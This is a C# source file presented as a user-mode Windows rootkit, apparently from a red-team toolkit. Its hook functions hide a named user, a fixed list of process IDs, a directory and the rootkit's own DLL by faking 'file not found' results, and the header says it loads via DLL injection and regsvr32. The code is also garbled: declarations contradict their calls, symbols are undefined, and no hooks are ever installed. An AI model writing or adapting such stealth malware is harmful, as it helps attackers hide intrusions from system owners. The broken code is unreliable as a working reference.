/**
 * @file win_ring3_rootkit.cs
 * @author Gris Iscomeback
 * @brief A Ring 3 Windows rootkit to hide users, processes, directories, and files.
 *
 * @details This rootkit intercepts various system calls to hide specific users,
 * processes, directories, and files. It is designed to be loaded using DLL injection.
 *
 * @compile Using Visual Studio or .NET CLI
 * @load Regsvr32 win_ring3_rootkit.dll
 *
 * @defines
 * HIDDEN_DIR "lazyown_atomic_test"
 * HIDDEN_FILE "win_ring3_rootkit.dll"
 * HIDE_USER "grisun0"
 * MAX_HIDE_PIDS 11
 *
 * @functions
 * GetUsernameFromPid(int pid)
 * ShouldHidePid(string pid)
 * HookFindFirstFile(string path, WIN32_FIND_DATA findData)
 * HookCreateFile(string path, uint access, uint share, SECURITY_ATTRIBUTES security, uint creation, uint flags, IntPtr template)
 */

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32.SafeHandles;
using System.IO;

class WinRing3Rootkit
{
    private const string HIDDEN_DIR = "lazyown_atomic_test";
    private const string HIDDEN_FILE = "win_ring3_rootkit.dll";
    private const string HIDE_USER = "grisun0";
    private const int MAX_HIDE_PIDS = 11;
    private static string[] hide_pids = { "3061", "2398", "3102", "3109", "3110", "3112", "3204", "3218", "2822", "2823", "2705" };

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern SafeFileHandle FindFirstFile(string lpFileName, out WIN32_FIND_DATA lpFindFileData);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern SafeFileHandle CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, SECURITY_ATTRIBUTES lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public struct WIN32_FIND_DATA
    {
        public FileAttributes dwFileAttributes;
        public FileTime ftCreationTime;
        public FileTime ftLastAccessTime;
        public FileTime ftLastWriteTime;
        public uint nFileSizeHigh;
        public uint nFileSizeLow;
        public uint dwReserved0;
        public uint dwReserved1;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
        public string cFileName;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 14)]
        public string cAlternateFileName;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        public int bInheritHandle;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern uint GetCurrentProcessId();

    [DllImport("psapi.dll", SetLastError = true)]
    private static extern uint GetProcessId(IntPtr Process);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

    [DllImport("advapi32.dll", SetLastError = true, SetLastError = true, CharSet = CharSet.Auto)]
    private static extern uint OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern uint GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hObject);

    public enum TOKEN_INFORMATION_CLASS
    {
        TokenUser = 1,
        TokenGroups,
        TokenPrivileges,
        TokenOwner,
        TokenPrimaryGroup,
        TokenDefaultDacl,
        TokenSource,
        TokenType,
        TokenImpersonationLevel,
        TokenStatistics,
        TokenRestrictedSids,
        TokenSessionId,
        TokenGroupsAndPrivileges,
        TokenSessionReference,
        TokenSandBoxInert,
        TokenAuditPolicy,
        TokenOrigin,
        TokenElevationType,
        TokenLinkedToken,
        TokenElevation,
        TokenHasRestrictions,
        TokenAccessInformation,
        TokenVirtualizationAllowed,
        TokenVirtualizationEnabled,
        TokenIntegrityLevel,
        TokenUIAccess,
        TokenMandatoryPolicy,
        TokenLogonSid,
        MaxTokenInfoClass
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_USER
    {
        public SID_AND_ATTRIBUTES User;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SID_AND_ATTRIBUTES
    {
        public IntPtr Sid;
        public int Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SID
    {
        public byte Revision;
        public byte SubAuthorityCount;
        public byte IdentifierAuthority;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 6)]
        public byte[] SubAuthority;
    }

    public static string GetUsernameFromPid(int pid)
    {
        IntPtr hProcess = OpenProcess(0x0400 | 0x0010, false, (uint)pid);
        if (hProcess == IntPtr.Zero) return null;

        IntPtr hToken;
        if (OpenProcessToken(hProcess, 8, out hToken) == 0)
        {
            CloseHandle(hProcess);
            return null;
        }

        IntPtr pTokenUser = IntPtr.Zero;
        try
        {
            uint ReturnLength;
            uint cbTokenUser = (uint)Marshal.SizeOf(typeof(TOKEN_USER));
            IntPtr pTokenInformation = Marshal.AllocHGlobal((int)cbTokenUser);
            if (!GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenUser, pTokenInformation, cbTokenUser, out ReturnLength))
            {
                CloseHandle(hProcess);
                CloseHandle(hToken);
                return null;
            }

            pTokenUser = Marshal.PtrToStructure(pTokenInformation, typeof(TOKEN_USER));
            SID_AND_ATTRIBUTES user = (SID_AND_ATTRIBUTES)Marshal.PtrToStructure(pTokenUser, typeof(SID_AND_ATTRIBUTES));
            SID sid = (SID)Marshal.PtrToStructure(user.Sid, typeof(SID));

            StringBuilder account = new StringBuilder();
            StringBuilder domain = new StringBuilder();
            uint cchDomainName = (uint)domain.Capacity;
            uint cchAccountName = (uint)account.Capacity;
            SID_NAME_USE peUse;

            if (LookupAccountSid(IntPtr.Zero, sid, account, ref cchAccountName, domain, ref cchDomainName, out peUse))
            {
                CloseHandle(hProcess);
                CloseHandle(hToken);
                return account.ToString();
            }
        }
        finally
        {
            if (pTokenUser != IntPtr.Zero)
            {
                Marshal.FreeHGlobal(pTokenUser);
            }
            CloseHandle(hProcess);
            CloseHandle(hToken);
        }
        return null;
    }

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool LookupAccountSid(IntPtr pSid, [Out] StringBuilder domain, ref uint cchDomain, [Out] StringBuilder account, ref uint cchAccountName, out SID_NAME_USE peUse);

    public static bool ShouldHidePid(string pid)
    {
        int pid_num = int.Parse(pid);
        string username = GetUsernameFromPid(pid_num);
        if (username != null && string.Compare(username, HIDE_USER, true) == 0)
        {
            return true;
        }
        return false;
    }

    public static SafeFileHandle HookFindFirstFile(string path, out WIN32_FIND_DATA findData)
    {
        if (path.Contains(HIDDEN_DIR) || path.Contains(HIDDEN_FILE))
        {
            SetLastError(0x2); // ERROR_FILE_NOT_FOUND
            findData = new WIN32_FIND_DATA();
            return new SafeFileHandle(IntPtr.Zero, true);
        }

        return FindFirstFile(path, out findData);
    }

    public static SafeFileHandle HookCreateFile(string path, uint access, uint share, SECURITY_ATTRIBUTES security, uint creation, uint flags, IntPtr template)
    {
        if (path.Contains(HIDDEN_FILE))
        {
            SetLastError(0x2); // ERROR_FILE_NOT_FOUND
            return new SafeFileHandle(IntPtr.Zero, true);
        }

        return CreateFile(path, access, share, security, creation, flags, template);
    }
}
